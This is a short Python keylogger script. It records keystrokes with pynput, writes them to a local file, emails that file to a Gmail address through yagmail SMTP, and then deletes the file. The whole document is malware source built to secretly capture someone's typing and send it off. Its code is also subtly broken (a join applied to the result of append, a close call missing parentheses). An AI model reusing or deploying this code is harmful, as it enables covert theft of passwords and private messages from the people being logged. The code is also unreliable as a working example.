import pynput.keyboard
import yagmail
import os
import sys
add_keys=[]
key=""
def process_keys(key):
	if len(add_keys) == 10:
		sys.exit()
	else :
		''.join(add_keys.append(str(key))) #if the program has some error try with --> add_keys.append(str(key))


def delete():
	try:
		os.remove("key.txt")
	except:
		pass
def sends():
	yag=yagmail.SMTP(user='',password='') #enter your gmail id and password here
	yag.send(to='', contents='Keylogger',attachments="key.txt") #enter the gmail id you want to send the key.txt file to
	delete()


listener=pynput.keyboard.Listener(on_press=process_keys)

with listener:
	listener.join()
for i in add_keys:
	f=open('key.txt','a')
	f.write(i)
	f.close
sends()